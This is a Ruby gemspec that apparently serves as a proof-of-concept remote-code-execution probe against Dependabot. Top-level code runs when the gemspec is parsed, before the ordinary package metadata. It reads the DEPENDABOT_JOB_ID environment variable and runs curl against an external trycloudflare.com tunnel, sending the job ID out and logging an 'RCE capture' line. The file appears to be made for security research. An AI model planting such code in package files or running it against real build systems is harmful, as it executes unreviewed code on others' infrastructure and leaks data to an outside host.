require "open3"

job_id = ENV.fetch("DEPENDABOT_JOB_ID", "unknown")
capture_url = "https://endless-durham-invitations-deaf.trycloudflare.com/sibling-capture/job-#{job_id}-f005-rce-v1"

stdout, _stderr, status = Open3.capture3(
  "curl", "--location", "--silent", "--show-error", "--max-time", "15",
  "--output", "/dev/null", "--write-out", "%{http_code}", capture_url
)
warn "F005_RCE_CAPTURE_PROBE job_id=#{job_id} http_code=#{stdout.strip.inspect} exit=#{status.exitstatus}"

Gem::Specification.new do |spec|
  spec.name = "dependabot-untrusted-probe"
  spec.version = "0.0.1"
  spec.summary = "Owned dependency provenance probe"
  spec.authors = ["chawdamrunal"]
  spec.files = ["lib/dependabot_untrusted_probe.rb"]
  spec.require_paths = ["lib"]
  spec.license = "MIT"
end
